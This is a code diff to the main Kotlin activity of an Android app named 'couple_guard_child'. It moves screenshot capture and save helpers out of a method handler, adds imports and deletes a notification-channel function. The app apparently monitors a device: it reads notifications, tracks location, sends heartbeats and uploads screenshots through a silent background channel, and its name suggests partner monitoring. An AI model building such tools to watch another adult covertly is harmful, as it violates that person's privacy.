@@ -3,6 +3,7 @@ package com.example.couple_guard_child
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.content.Context
+import android.graphics.Bitmap  // ✅ ADD THIS
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
@@ -15,6 +16,8 @@ import io.flutter.plugin.common.MethodChannel
 import com.example.couple_guard_child.services.background.MyNotificationListenerService
 import com.example.couple_guard_child.workers.LocationWorkManager
 import com.example.couple_guard_child.utils.BatteryOptimizationHelper
+import java.io.File  // ✅ ADD THIS
+import java.io.FileOutputStream  // ✅ ADD THIS
 
 class MainActivity: FlutterActivity() {
     private val CHANNEL = "notification_listener_channel"
@@ -56,7 +59,7 @@ class MainActivity: FlutterActivity() {
                     setSound(null, null)
                 }
                 
-                // ✅ ADD: Geofence alert channel
+                // Geofence alert channel
                 val geofenceChannel = NotificationChannel(
                     "geofence_alerts",
                     "Geofence Alerts",
@@ -117,7 +120,6 @@ class MainActivity: FlutterActivity() {
                 "sendHeartbeat" -> {
                     Log.d(TAG, "💓 Sending heartbeat to server")
                     try {
-                        // Send heartbeat via ApiClient
                         val success = com.example.couple_guard_child.utils.ApiClient.updateDeviceStatus(
                             applicationContext,
                             true
@@ -131,7 +133,7 @@ class MainActivity: FlutterActivity() {
                 }
                 "captureScreen" -> {
                     try {
-                        val bitmap = captureScreenshot()
+                        val bitmap = captureScreenshot()  // ✅ Call function
                         val file = saveBitmap(bitmap)
                         Thread {
                             val success = com.example.couple_guard_child.utils.ApiClient.uploadScreenshot(
@@ -150,22 +152,6 @@ class MainActivity: FlutterActivity() {
                 }
                 else -> result.notImplemented()
             }
-        }
-
-        private fun captureScreenshot(): Bitmap {
-            val view = window.decorView.rootView
-            view.isDrawingCacheEnabled = true
-            val bitmap = Bitmap.createBitmap(view.drawingCache)
-            view.isDrawingCacheEnabled = false
-            return bitmap
-        }
-        
-        private fun saveBitmap(bitmap: Bitmap): File {
-            val file = File(cacheDir, "screenshot_${System.currentTimeMillis()}.jpg")
-            FileOutputStream(file).use { out ->
-                bitmap.compress(Bitmap.CompressFormat.JPEG, 85, out)
-            }
-            return file
         }
         
         // Location worker channel
@@ -227,38 +213,21 @@ class MainActivity: FlutterActivity() {
         Log.d(TAG, "✅ Location MethodChannel registered")
     }
     
-    private fun createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            try {
-                val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-                
-                val existingChannel = notificationManager.getNotificationChannel(NOTIFICATION_CHANNEL_ID)
-                
-                if (existingChannel == null) {
-                    Log.d(TAG, "Creating notification channel: $NOTIFICATION_CHANNEL_ID")
-                    
-                    val channel = NotificationChannel(
-                        NOTIFICATION_CHANNEL_ID,
-                        NOTIFICATION_CHANNEL_NAME,
-                        NotificationManager.IMPORTANCE_LOW
-                    ).apply {
-                        description = "Keeps the app running in background for family safety"
-                        setShowBadge(false)
-                        enableLights(false)
-                        enableVibration(false)
-                        setSound(null, null)
-                    }
-                    
-                    notificationManager.createNotificationChannel(channel)
-                    Log.d(TAG, "✅ Notification channel created")
-                } else {
-                    Log.d(TAG, "✅ Notification channel already exists")
-                }
-                
-            } catch (e: Exception) {
-                Log.e(TAG, "❌ Failed to create notification channel", e)
-            }
+    // ✅ FIX: Move functions OUTSIDE setMethodCallHandler
+    private fun captureScreenshot(): Bitmap {
+        val view = window.decorView.rootView
+        view.isDrawingCacheEnabled = true
+        val bitmap = Bitmap.createBitmap(view.drawingCache)
+        view.isDrawingCacheEnabled = false
+        return bitmap
+    }
+    
+    private fun saveBitmap(bitmap: Bitmap): File {
+        val file = File(cacheDir, "screenshot_${System.currentTimeMillis()}.jpg")
+        FileOutputStream(file).use { out ->
+            bitmap.compress(Bitmap.CompressFormat.JPEG, 85, out)
         }
+        return file
     }
 
     private fun isNotificationServiceEnabled(): Boolean {
